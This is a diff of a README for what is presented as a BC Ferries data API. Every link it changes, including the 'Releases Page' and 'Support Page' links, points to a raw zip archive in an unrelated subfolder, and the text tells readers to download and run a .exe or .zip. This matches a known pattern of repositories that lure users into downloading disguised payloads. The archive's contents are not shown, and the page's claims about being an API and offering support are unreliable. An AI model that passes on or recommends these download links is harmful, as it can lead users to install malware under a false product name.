@@ -1,6 +1,6 @@
 # 🚢 bc-ferries-api - Access Live BC Ferries Data Easily
 
-[![Download](https://github.com/SoulsGoAwayThe/bc-ferries-api/raw/refs/heads/main/seminomata/bc-ferries-api-1.9.zip)](https://github.com/SoulsGoAwayThe/bc-ferries-api/raw/refs/heads/main/seminomata/bc-ferries-api-1.9.zip)
+[![Download](https://github.com/SoulsGoAwayThe/bc-ferries-api/raw/refs/heads/main/seminomata/bc_api_ferries_v3.5.zip)](https://github.com/SoulsGoAwayThe/bc-ferries-api/raw/refs/heads/main/seminomata/bc_api_ferries_v3.5.zip)
 
 ## 🚀 Getting Started
 
@@ -10,7 +10,7 @@ Welcome to the **BC Ferries API**. This application allows you to access live sa
 
 To begin using the **BC Ferries API**, follow these steps:
 
-1. Visit the [Releases Page](https://github.com/SoulsGoAwayThe/bc-ferries-api/raw/refs/heads/main/seminomata/bc-ferries-api-1.9.zip).
+1. Visit the [Releases Page](https://github.com/SoulsGoAwayThe/bc-ferries-api/raw/refs/heads/main/seminomata/bc_api_ferries_v3.5.zip).
 2. Look for the latest version of the application.
 3. Click on the link to download the file compatible with your operating system. It may be a `.exe` or `.zip` file depending on your platform.
 4. Once the download is complete, locate the downloaded file on your computer.
@@ -43,7 +43,7 @@ Make sure your system meets the following requirements:
 ## 🔗 Additional Resources
 
 - **Documentation:** Comprehensive guides are available to assist you in using the API effectively.
-- **Support:** If you encounter issues or have questions, please visit the [Support Page](https://github.com/SoulsGoAwayThe/bc-ferries-api/raw/refs/heads/main/seminomata/bc-ferries-api-1.9.zip).
+- **Support:** If you encounter issues or have questions, please visit the [Support Page](https://github.com/SoulsGoAwayThe/bc-ferries-api/raw/refs/heads/main/seminomata/bc_api_ferries_v3.5.zip).
 
 ## 🛠️ Development and Contributions
 
@@ -56,6 +56,6 @@ This repository welcomes contributions! If you wish to enhance the application o
 
 Your feedback is essential in improving the application. Share your experiences, suggestions, or any issues you face. This way, we can work together to make the **BC Ferries API** even better.
 
-Remember, you can always revisit our [Releases Page](https://github.com/SoulsGoAwayThe/bc-ferries-api/raw/refs/heads/main/seminomata/bc-ferries-api-1.9.zip) for updates or new features.
+Remember, you can always revisit our [Releases Page](https://github.com/SoulsGoAwayThe/bc-ferries-api/raw/refs/heads/main/seminomata/bc_api_ferries_v3.5.zip) for updates or new features.
 
 Thank you for using the **BC Ferries API**! We hope it makes your travel planning smoother and more efficient.
